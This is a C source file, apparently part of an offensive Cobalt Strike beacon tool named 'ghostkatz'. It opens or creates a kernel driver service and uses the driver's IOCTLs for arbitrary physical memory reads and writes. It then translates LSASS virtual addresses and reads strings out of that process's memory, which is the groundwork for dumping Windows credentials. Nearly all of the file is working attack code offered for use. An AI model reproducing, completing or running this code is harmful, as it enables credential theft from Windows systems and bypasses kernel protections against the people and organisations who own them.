#include <windows.h>
#include <psapi.h>

#include "ghostkatz.h"
#include "defs.h"

BOOL isServiceInstalled()
{
    SC_HANDLE hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hSCManager == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR, "Failed to open SCM!");
        return FALSE;
    }

    SC_HANDLE hServiceObject = OpenServiceA(hSCManager, "TpwSav", SERVICE_ALL_ACCESS);
    if (hServiceObject == NULL)
    {
        if (GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST)
        {
            //hServiceObject = CreateServiceA(hSCManager, "TpwSav", "TpwSav", SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, "C:\\Windows\\System32\\drivers\\tpwsav.sys", NULL, NULL, NULL, NULL, "");
            hServiceObject = NULL; // TODO: Remove after upload functionality is implemented
            if (hServiceObject == NULL)
            {
                BeaconPrintf(CALLBACK_ERROR, "Failed to create driver service! 0x%llx", GetLastError());
                return FALSE;
            }
            else
            {
                BeaconPrintf(CALLBACK_OUTPUT, "Created driver service!");
                return TRUE;
            }
        }
        else
        {
            BeaconPrintf(CALLBACK_ERROR, "Failed to open service object!");
            return FALSE;
        }
    }
    else
    {
        BeaconPrintf(CALLBACK_OUTPUT, "Found pre-existing driver service!");
        return TRUE;
    }
}

char* GetWinBuildNumber()
{
    static char g_BuildStr[32];  // persists after return
    DWORD cbData = sizeof(g_BuildStr);
    g_BuildStr[0] = '\0';

    LONG st = RegGetValueA(
        HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
        "CurrentBuildNumber",
        RRF_RT_REG_SZ,
        NULL,
        (PVOID)g_BuildStr,
        &cbData
    );

    if (st != ERROR_SUCCESS) 
    {
        BeaconPrintf(CALLBACK_ERROR, "Failed to get Windows build number (err=%ld)\n", st);
        return NULL;
    }

    return g_BuildStr;
}

BOOL WriteByte(HANDLE hFile, ULONG_PTR PhysicalAddress, BYTE WriteValue)
{
    typedef struct _PHYSICAL_WRITE_REQUEST {
        UINT64 PhysicalAddr;
        BYTE Value;
    } PHYSICAL_WRITE_REQUEST, * PPHYSICAL_WRITE_REQUEST;

    PHYSICAL_WRITE_REQUEST request = { 0 };

    int size = sizeof(PHYSICAL_WRITE_REQUEST);
    DWORD bytesReturned = 0;
    UINT32 physAddr = 0;

    request.PhysicalAddr = PhysicalAddress;
    request.Value = WriteValue;

    BOOL result = DeviceIoControl(hFile,
        TPWSAV_WRITE_IOCTL,
        &request,
        sizeof(request),
        &request,
        sizeof(request),
        &bytesReturned,
        NULL);

    if (!result) {
        BeaconPrintf(CALLBACK_OUTPUT, "DeviceIoControl failed: %lu\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

BOOL ReadByte(HANDLE hFile, ULONG_PTR PhysicalAddress, PBYTE ReadValue)
{

    typedef struct _PHYSICAL_READ_REQUEST {
        UINT64 PhysicalAddr;
        BYTE ReadValue;
    } PHYSICAL_READ_REQUEST, * PPHYSICAL_READ_REQUEST;


    PHYSICAL_READ_REQUEST request = { 0 };
    int size = sizeof(PHYSICAL_READ_REQUEST);
    DWORD bytesReturned = 0;
    UINT32 physAddr = 0;

    request.PhysicalAddr = PhysicalAddress;
    bytesReturned = 0;

    BOOL result = DeviceIoControl(hFile, TPWSAV_READ_IOCTL, &request, sizeof(request), &request, sizeof(request), &bytesReturned, NULL);
    if (!result) {
        BeaconPrintf(CALLBACK_OUTPUT, "DeviceIoControl failed: %lu\n", GetLastError());
        return FALSE;
    }

    *ReadValue = request.ReadValue;

    return TRUE;
}

unsigned char* ReadMultipleBytes(HANDLE hFile, int NumberOfBytesToRead, DWORD64 PhysicalAddress, BOOL Forwards)
{
    unsigned char* ByteArray = (unsigned char*)malloc(NumberOfBytesToRead * sizeof(unsigned char));
    int j = 0;
    BYTE ReadValue = 0;
    if (Forwards)
    {
        for (DWORD64 i = PhysicalAddress; i < PhysicalAddress + NumberOfBytesToRead; i++)
        {
            ReadByte(hFile, i, &ReadValue);
            ByteArray[j] = ReadValue;
            j++;
        }
    }
    else
    {
        for (DWORD64 i = PhysicalAddress + NumberOfBytesToRead - 1; i >= PhysicalAddress; i--)
        {
            ReadByte(hFile, i, &ReadValue);
            ByteArray[j] = ReadValue;
            j++;
        }
    }

    return ByteArray;
}

DWORD64 ByteScan(HANDLE hFile, unsigned char* TargetByteArray, int MaxNumberOfBytesToRead, DWORD64 PhysicalAddress)
{
    //DEBUG_PRINT("Performing a byte scan starting at physical address 0x%llx\n", PhysicalAddress);

    int ArraySize = sizeof(TargetByteArray) - 1;
    int arrayCounter = 0;

    unsigned char* InternalByteArray = (unsigned char*)malloc(ArraySize * sizeof(char));
    DWORD PhysicalAddressWhereByteArrayFound = 0;
    BYTE readByteValue = 0;

    for (DWORD64 i = PhysicalAddress; i < PhysicalAddress + MaxNumberOfBytesToRead; i++)
    {
        ReadByte(hFile, i, &readByteValue);
        InternalByteArray[arrayCounter] = readByteValue;

        //printf("Target Byte: 0x%x\n", TargetByteArray[arrayCounter]);

        if (arrayCounter == ArraySize - 1)
        {
            PhysicalAddressWhereByteArrayFound = i - ArraySize;
            break;
        }


        if (TargetByteArray[arrayCounter] == 0x90)
        {
            arrayCounter++;
        }
        else if (InternalByteArray[arrayCounter] != TargetByteArray[arrayCounter])
        {
            arrayCounter = 0;
        }
        else
        {
            arrayCounter++;
        }
    }
    free(InternalByteArray);

    return PhysicalAddressWhereByteArrayFound;
}


// Very similar to the ReadMultipleBytes function but we need it to go backwards to read address correctly
DWORD64 ReadAddressAtPhysicalAddressLocation(HANDLE hFile, DWORD64 PhysicalAddress)
{
    BYTE value = 0;
    DWORD64 address = 0;
    for (DWORD64 i = PhysicalAddress + 7; i >= PhysicalAddress; i--)
    {
        ReadByte(hFile, i, &value);
        address = (address << 8);
        address += value;
    }
    return address;
}

wchar_t* ReadUnicodeStringFromPhysical(HANDLE hFile, DWORD64 UnicodeStringStructPA, DWORD lower32bits, int LsassPID)
{
    /*
      typedef struct _UNICODE_STRING {
      USHORT Length;         // Offset 0 (2 bytes)
      USHORT MaximumLength;  // Offset 2 (2 bytes)
                             // 4 bytes invisible padding
      PWSTR  Buffer;         // Offset 8 (8 bytes)
    } UNICODE_STRING, *PUNICODE_STRING;
    */

    // It is a UNICODE_STRING struct so we have to get the string length at the first byte, and the pointer to the string will start at 0x8

    // Get length
    BYTE UnicodeStringLength = 0;
    ReadByte(hFile, UnicodeStringStructPA + 0x2, &UnicodeStringLength); // the 0x2 is to get the max length of the unicode string

    // Get address to the wide string
    DWORD64 UnicodeStringPA = 0;
    DWORD64 pUnicodeStringVA = ReadAddressAtPhysicalAddressLocation(hFile, UnicodeStringStructPA + 0x8);
    TranslateUVA2Physical(pUnicodeStringVA, &UnicodeStringPA, lower32bits, LsassPID);

    // Read wide string & store string properly
    wchar_t* UnicodeString = (wchar_t*)malloc(UnicodeStringLength * sizeof(wchar_t));
    int j = 0;
    BYTE ReadValueLow = 0;
    BYTE ReadValueHigh = 0;
    for (DWORD64 i = UnicodeStringPA; i < UnicodeStringPA + UnicodeStringLength; i += 2)
    {
        ReadByte(hFile, i, &ReadValueLow);
        ReadByte(hFile, i + 1, &ReadValueHigh);
        UnicodeString[j] = (wchar_t)(ReadValueLow | ReadValueHigh << 8);
        j++;
    }
    UnicodeString[j] = L'\0';


    return UnicodeString;
}

// BOOL PrintHex(unsigned char* ByteArray, int ByteArraySize)
// {
//     for (int i = 0; i < ByteArraySize; i++)
//     {
//         printf("%02x", ByteArray[i]);
//     }
//     printf("\n");

//     return TRUE;
// }

DWORD SearchPattern(unsigned char* mem, DWORD NumOfBytesToSearch, unsigned char* signature, DWORD signatureLen)
{
    ULONG offset = 0;

    // Hunt for signature locally to avoid a load of RPM calls
    for (int i = 0; i < NumOfBytesToSearch; i++) {
        if (*(unsigned char*)(mem + i) == signature[0] && *(unsigned char*)(mem + i + 1) == signature[1]) {
            if (memcmp(mem + i, signature, signatureLen) == 0) {
                // Found the signature
                offset = i;
                break;
            }
        }
    }

    return offset;
}